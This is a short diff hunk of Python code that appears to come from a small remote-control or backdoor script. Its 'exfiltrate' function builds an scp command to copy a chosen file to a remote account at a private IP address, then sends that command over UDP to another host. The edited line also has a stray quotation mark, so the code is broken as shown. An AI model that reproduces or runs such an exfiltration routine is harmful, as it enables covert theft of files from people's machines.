@@ -21,7 +21,7 @@ def execute(command):
 		print("OWO (notices lack of internet connection)")
 
 def exfiltrate(filepath):
-	command = ('scp ' + filepath + " snag@192.168.:~/milo")
+	command = ('scp ' + filepath + " snag@192.168.43.218":~/milo")
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.sendto((command), (ip, 5050))
 
